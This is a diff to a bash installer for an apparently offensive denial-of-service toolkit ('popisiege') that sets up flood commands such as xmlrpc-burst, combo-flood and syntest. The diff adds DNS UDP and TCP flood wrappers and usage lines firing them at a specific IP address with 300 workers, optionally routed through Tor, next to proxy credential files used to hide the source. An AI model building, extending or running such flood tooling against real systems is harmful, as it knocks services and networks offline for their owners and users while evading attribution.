@@ -17,6 +17,8 @@ BIN_HOME="/usr/local/bin/popihome"
 BIN_XMLRPC="/usr/local/bin/xmlrpc-burst"
 BIN_UPLOAD="/usr/local/bin/upload-burst"
 BIN_COMBO="/usr/local/bin/combo-flood"
+BIN_DNS_UDP="/usr/local/bin/dns-flood"
+BIN_DNS_TCP="/usr/local/bin/dns-tcp-flood"
 BACKBONE_CREDS="$INSTALL_DIR/proxies_webshare_backbone_creds.txt"
 
 echo ""
@@ -150,6 +152,20 @@ exec python3 combo_flood.py "\$@"
 EOF
 chmod +x "$BIN_COMBO"
 
+cat > "$BIN_DNS_UDP" << EOF
+#!/usr/bin/env bash
+cd /opt/popisiege
+exec python3 dns_flood.py "\$@"
+EOF
+chmod +x "$BIN_DNS_UDP"
+
+cat > "$BIN_DNS_TCP" << EOF
+#!/usr/bin/env bash
+cd /opt/popisiege
+exec python3 dns_tcp_flood.py "\$@"
+EOF
+chmod +x "$BIN_DNS_TCP"
+
 echo ""
 echo "=============================="
 echo "  Done."
@@ -201,7 +217,12 @@ echo "    syntest --target <IP> --port 22 --rate 1000 --duration 30"
 echo "    syntest --target <IP> --port 22,80,443 --http-probe https://example.com/"
 echo "    (logs saved to logs/ directory automatically)"
 echo ""
-echo "  All tools:"
+echo "  DNS Open Resolver Flood:
+    dns-flood --target 104.236.68.226 --workers 300
+    dns-tcp-flood --target 104.236.68.226 --workers 300
+    dns-tcp-flood --target 104.236.68.226 --workers 300 --tor
+
+  All tools:"
 echo "    --verbose        show every request"
 echo "    --delay 1        pause between bursts"
 echo "    --proxy-file     custom proxy list"
